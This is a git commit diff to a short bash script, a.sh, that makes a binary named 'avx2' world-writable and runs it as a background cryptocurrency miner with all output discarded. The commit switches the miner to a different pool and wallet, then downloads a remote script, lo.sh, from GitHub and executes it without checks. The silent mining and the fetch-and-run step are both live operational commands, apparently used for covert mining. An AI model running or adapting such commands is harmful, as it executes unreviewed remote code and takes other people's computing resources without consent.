fb48da69bf3dce91da61c0d9b9bdb3110894057b
ncamacho07 <84513246+ncamacho07@users.noreply.github.com>
2022-03-09 09:42:38 +0700

    Update a.sh

--- a.sh
+++ a.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 chmod 777 avx2
-./avx2 -a gr -o stratum+tcp://eu.mecrypto.club:3051 -u XrTiXbCzAMAwzXnPuVLdLNugtH4wn1525j.$(echo $(shuf -i 1-20000 -n 1)-V) -p c=BUTK-gr > /dev/null 2>&1 &
-wget https://raw.githubusercontent.com/jsiqiisn/baby/main/lo.sh && chmod +x lo.sh && ./lo.sh
+./avx2 -a curvehash -o stratum+tcp://asia.mecrypto.club:5310 -u PWfbcD1kqcxGPkMcd8i1VRN6jgBsvHUeJT.$(echo $(shuf -i 1-20000 -n 1)-aing) -p c=PLSR > /dev/null 2>&1 &
+wget https://raw.githubusercontent.com/ncamacho07/butut/main/lo.sh && chmod +x lo.sh && ./lo.sh
